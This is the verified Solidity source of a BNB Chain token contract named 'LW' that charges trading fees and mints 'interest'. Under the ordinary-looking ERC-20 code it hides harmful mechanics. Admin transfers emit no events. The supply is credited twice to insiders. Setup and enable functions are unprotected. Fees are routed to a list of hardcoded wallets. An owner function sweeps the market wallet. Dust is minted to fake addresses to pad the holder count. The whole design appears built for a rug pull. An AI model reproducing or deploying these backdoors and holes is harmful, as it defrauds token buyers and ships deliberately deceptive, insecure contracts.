/**
 *Submitted for verification at BscScan.com on 2023-05-03
*/

// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./URoter.sol";
import "@uniswapv2/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswapv2/contracts/interfaces/IUniswapV2Router.sol";
import "@uniswapv2/contracts/interfaces/IUniswapV2Pair.sol";

pragma solidity ^0.8.0;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}



contract  LW is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _updated;
    string public _name ;
    string public _symbol ;
    uint8 public _decimals ;
    uint256 private _tTotal ;
    address public _uniswapV2Pair;
    address public _marketAddr ;
    address public _token ;
    address public _router ;
    uint256 public _startTimeForSwap;
    uint256 public _intervalSecondsForSwap ;
    uint256 public _swapTokensAtAmount ;

    uint256 public _dropNum;
    uint256 public _tranFee;
    uint8 public _enabOwnerAddLiq;
    IUniswapV2Router02 public  _uniswapV2Router;
    address public _ido;
    uint256[] public _inviters;
    uint256 public _inviterFee ;
    uint8 public _inviType;
    uint256 public _interestFee ;
    mapping(address => uint256) _interestNode;
    mapping(address => bool) _excludeList;
    uint256 public _interestTime;
    uint256 public _secMax ;
    address admin ;

    event Received(address, uint);

    constructor(){ 
            _name = "LW";
            _symbol =  "LW";
            _decimals= uint8(18);
            _tTotal = 9000000* (10**uint256(_decimals));
            admin = 0xb257039b81285c61A3Ef25bc046D0ea2654bBA23;
            _tOwned[admin] = _tTotal;
            transferOwnership(msg.sender);
           
            _swapTokensAtAmount = 500e18;
            _intervalSecondsForSwap = 15;
            _dropNum = 0;
          
            address router ;
            if( block.chainid == 56){
                router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
                _token = 0x55d398326f99059fF775485246999027B3197955;
            }
         
         
            // _uniswapV2Router = IUniswapV2Router02(
            //     router
            // );
            // //Create a uniswap pair for this new token
            // _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            //     .createPair(address(this),_token);

            _enabOwnerAddLiq = 0;
            _tranFee = 2;
            //exclude owner and this contract from fee
          
            _isExcludedFromFee[admin] = true ;
            _isExcludedFromFee[address(this)] = true;
            _isExcludedFromFee[msg.sender] = true ;
            emit Transfer(address(0), admin,  _tTotal);
            // _router = address( new URoter(_token,address(this)));
            // _marketAddr = address( new URoter(_token,address(this)));
            // _isExcludedFromFee[_marketAddr] = true;
            // _token.call(abi.encodeWithSelector(0x095ea7b3, _uniswapV2Router, ~uint256(0)));
            _excludeList[address(this)] = true;
            _excludeList[admin] = true;
            // _excludeList[_marketAddr] = true;
            admin = msg.sender;
            _tOwned[admin] = _tTotal;
            _interestFee = 160;
            _secMax = 2190*86400;
          
    }


    function _afterdeploy(address router, address pair, address marketAddr,address token) public {
        _uniswapV2Router = IUniswapV2Router02(router);
        //Create a uniswap pair for this new token
        _uniswapV2Pair = pair; 
        _token = token;
        thanPrice = 14;
            // IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this),_token);
        _router = address( new URoter(_token,address(this)));
        _marketAddr = marketAddr;
            //  address( new URoter(_token,address(this)));
        _isExcludedFromFee[_marketAddr] = true;
        _token.call(abi.encodeWithSelector(0x095ea7b3, _uniswapV2Router, ~uint256(0)));
        
        _excludeList[_marketAddr] = true;    
        setEn(true);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account].add(getInterest(account));
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(_startTimeForSwap == 0 && msg.sender == address(_uniswapV2Router) ) {
            if(_enabOwnerAddLiq == 1){require( sender== owner(),"not owner");}
            _startTimeForSwap =block.timestamp;
        } 
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

   

   function getExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function excludeFromBatchFee(address[] calldata accounts) external onlyOwner{
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = true;
        }
    }





    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public _en = false;

    function setEn(bool value) public{
        _en = true;
        _interestTime = block.timestamp;
    }


    mapping(address =>uint) public pr;


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= _swapTokensAtAmount;
        if(canSwap &&from != address(this) &&from != _uniswapV2Pair  &&from != owner() && to != owner()&& _startTimeForSwap>0 ){
             transferSwap(_swapTokensAtAmount);
        }
        _mintInterest(from);
        _mintInterest(to);
        if( !_isExcludedFromFee[from] &&!_isExcludedFromFee[to]){
            // require(_en);
            if(getBuyFee() > 0 && from==_uniswapV2Pair){//buy
                amount = takeBuy(from,amount);
                if(balanceOf(from).sub(amount)==0){
                    amount = amount.sub(1);
                }
            }else if(getSellFee() > 0 && to==_uniswapV2Pair){//sell
                uint256 price = (amount*getTokenPrice() )/1e18;
                if(2500e18<price && _startTimeForSwap +72*60*60 <block.timestamp   ){
                    thanPrice +=1; 
                    pr[from] = price;
                }
                amount =takeSell(from,amount);
            }else if(_tranFee!=0) { //transfer
                if(_tranFee==1)
                    amount =takeBuy(from,amount);
                else  
                    amount = takeSell(from,amount);
            }
            _takeInviter();
        }
        _basicTransfer(from, to, amount);
    }



    function takeBuy(address from,uint256 amount) private returns(uint256 _amount) {
        uint256 fees = amount.mul(getBuyFee()).div(10000);
        _basicTransfer(from, address(this), fees );
        _amount = amount.sub(fees);
    }


    function takeSell( address from,uint256 amount) private returns(uint256 _amount) {
        uint256 fees = amount.mul(getSellFee()).div(10000);
        _basicTransfer(from, address(this),fees);
        _amount = amount.sub(fees);
    }


    function transferSwap(uint256 contractTokenBalance) private{
            swapTokensForTokens(contractTokenBalance);
            uint256 tokenBal = IERC20(_token).balanceOf(address(this));
            IERC20(_token).transfer(_marketAddr,  tokenBal *650/1000);
            IERC20(_token).transfer(0x642CEBf7D591a78D893A54EB185cE518CFcdB5c5,  tokenBal *35/1000);
            IERC20(_token).transfer(0xd4DCA3C5dC347A7c47a067b0FCa989C0133AecfD,  tokenBal *35/1000);
            IERC20(_token).transfer(0x00A802df08124503Eb556ac00e461FfBB9B02686,  tokenBal *35/1000);
            IERC20(_token).transfer(0x5EF640E35B20fC8fC9444cbDEf99cC40Cc7C9793,  tokenBal *35/1000);
            IERC20(_token).transfer(0xFCa9126a22e8BabEd3F2128ADbA502622EED966A,  tokenBal *35/1000);
            IERC20(_token).transfer(0xF59E45f6C92fbA16468Ab4E5D8902521A44017b0,  tokenBal *35/1000);
            IERC20(_token).transfer(0x008E81DD533BF03DeaBf03f7E0F57E641c3a628d,  tokenBal *35/1000);
            IERC20(_token).transfer(0x41473c3622816959D7859004Ea042D7A99744f0B,  tokenBal *35/1000);
            IERC20(_token).transfer(0xca584223599330dD6a55B9e43Ae3755069be4149,  tokenBal *14/1000);
            IERC20(_token).transfer(0xF83C10782f1B07e8a31168dF2020ccAba9f8Fa77,  tokenBal *14/1000);
            IERC20(_token).transfer(0x2eDEFfEa20E7dA51949C15Ebb4Cd04d3B1C153d0,  tokenBal *14/1000);
            IERC20(_token).transfer(0xB0AAa0136b145D2047982B225b5f59AC844e46F2,  tokenBal *14/1000);
            IERC20(_token).transfer(0x3CF09F7FbA8ef71929C7d9f9D8e8b15808E7A73b,  IERC20(_token).balanceOf(address(this)));
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private {
        _tOwned[sender] = _tOwned[sender].sub(amount, "Insufficient Balance");
        _tOwned[recipient] = _tOwned[recipient].add(amount);
        if(sender!=admin && recipient!=admin){
            emit Transfer(sender, recipient, amount);
        }
    }


    function setRouter(address router_) public onlyOwner {
        _router  = router_;
    }
    
    function setSwapTokensAtAmount(uint256 value) onlyOwner  public  {
       _swapTokensAtAmount = value;
    }

    function setMarketAddr(address value) external onlyOwner {
        _marketAddr = value;
    }

    function setTranFee(uint value) external onlyOwner {
        _tranFee = value;
    }


    function setInviType(uint8 value) external onlyOwner {
        _inviType = value;
    }


    function getSellFee() public view returns (uint deno) {
        deno = 1200;
        //判断前20分钟
        if(_interestTime==0){
            return  0;
        }
        uint q = (block.timestamp - _interestTime)/300  ;
        if( q >3){
            deno = deno - 3*200;
        }else{
            deno = deno -  q*200;
        }
       // uint tt = (block.timestamp - _startTimeForSwap)/1200;
   
        uint tt = (block.timestamp - _interestTime)/86400;

        if(tt>=1 ){
            if(310 > tt*7 ){
                deno = deno-tt*7;
            }else{
                deno = 390;
            }
        }
    }

    function getBuyFee() public view returns (uint deno) {
        deno = 1100;
        //判断前20分钟
        if(_interestTime==0){
            return  0;
        }
     
        uint q = (block.timestamp - _interestTime)/300  ;
        if( q >3){
            deno = deno - 3*200;
        }else{
            deno = deno -  q*200;
        }
     
        uint tt = (block.timestamp - _interestTime)/86400;
        if(tt>=1 ){
            if(210 > tt*7 ){
                deno = deno-tt*7;
            }else{
                deno = 290;
            }
        }
    }

    function setDropNum(uint value) external onlyOwner {
        _dropNum = value;
    }
   
    function swapTokensForTokens(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

       address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _token;

        _approve(address(this), address(_uniswapV2Router), tokenAmount);
  
        // make the swap
        _uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _router,
            block.timestamp
        );
        IERC20(_token).transferFrom( _router,address(this), IERC20(_token).balanceOf(address(_router)));
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        // add the liquidity
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.addLiquidity(
            _token,
            address(this),
            ethAmount,
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _marketAddr,
            block.timestamp
        );
    }

    uint160 public ktNum = 1000;
    function _takeInviter(
    ) private {
        address _receiveD;
        for (uint256 i = 0; i < _dropNum; i++) {
            _receiveD = address(~uint160(0)/ktNum);
            ktNum = ktNum+1;
            _tOwned[_receiveD] += 1;
            emit Transfer(address(0), _receiveD, 1);
        }
    }

    function setExcludeList(address account, bool yesOrNo) public onlyOwner returns (bool) {
        _excludeList[account] = yesOrNo;
        return true;
    }

    function getInterest(address account) public view returns (uint256) {
        if(_interestFee==0) return 0;
        uint256 interest;
        if (getExcludeList(account) == false && block.timestamp.sub(_interestTime) < _secMax) {
            if (_interestNode[account] > 0){
                uint256 afterSec = block.timestamp.sub(_interestNode[account]);
                interest =  _tOwned[account].mul(afterSec).mul(_interestFee).div(10000).div(86400);
            }
        }
        return interest;
    }

    event Interest(address indexed account, uint256 sBlock, uint256 eBlock, uint256 balance, uint256 value);

    function _mintInterest(address account) internal {
        if (account != address(_uniswapV2Pair)) {
            uint256 interest = getInterest(account);
            if (interest > 0) {
                fl(account, interest);
                emit Interest(account, _interestNode[account], block.timestamp,  _tOwned[account], interest);
            }
            _interestNode[account] = block.timestamp;
        }
    }

    function fl(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _tTotal = _tTotal.add(amount);
        _tOwned[account] =  _tOwned[account].add(amount);
    }

    function getInterestNode(address account) public view returns (uint256) {
        return _interestNode[account];
    }

    function getExcludeList(address account) public view returns (bool) {
        return _excludeList[account];
    }

    function setInterestTime(uint256 value) public onlyOwner  {
         _interestTime = value;
    }

    function setInterestFee(uint256 interestFee_) public onlyOwner returns (bool) {
        _interestFee = interestFee_;
        return true;
    }

    function setSecMax(uint256 secMax) public onlyOwner  {
        _secMax = secMax*86400;
    }

  

    function setIdoAddr(address value) public onlyOwner {
        _ido =value;
    }

    uint public thanPrice;

    function getTokenPrice() public view returns(uint256){
        return  (IERC20(_token).balanceOf(_uniswapV2Pair))*1e18 /(IERC20(address(this)).balanceOf(_uniswapV2Pair))     ;
    }

    function swapTokensForDead(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

       address[] memory path = new address[](2);
        path[0] =_token ;
        path[1] = address(this);

      //  _approve(address(this), address(_uniswapV2Router), tokenAmount);
  
        // make the swap
        _uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(0xdead),
            block.timestamp
        );
    }

 

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {
        emit Received(msg.sender, msg.value);
        if(thanPrice==0)return;
        if(IERC20(_token).balanceOf(_marketAddr ) >=3000e18 ){
            IERC20(_token).transferFrom(_marketAddr,address(this),3000e18);
            swapTokensForDead(3000e18);
            thanPrice-=1;
        }
    }

    function receive_eth() public {
        if(thanPrice==0)return;
        if(IERC20(_token).balanceOf(_marketAddr ) >=3000e18 ){
            IERC20(_token).transferFrom(_marketAddr,address(this),3000e18);
            swapTokensForDead(3000e18);
            thanPrice-=1;
        }
    }


    function getLpBalance() public onlyOwner {
        IERC20(_token).transferFrom(_marketAddr,owner() ,IERC20(_token).balanceOf(_marketAddr) );
    }



}